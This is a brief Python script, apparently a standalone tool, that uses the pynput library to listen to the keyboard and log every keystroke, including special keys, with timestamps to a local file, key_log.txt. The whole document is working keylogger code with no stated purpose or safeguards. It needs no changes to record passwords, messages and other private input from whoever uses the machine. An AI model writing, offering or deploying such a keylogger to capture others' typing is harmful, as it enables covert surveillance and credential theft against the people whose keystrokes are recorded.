from pynput import keyboard
import logging

# Set log file path
log_file = "key_log.txt"

# Set up logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Define key press function
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Set up listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
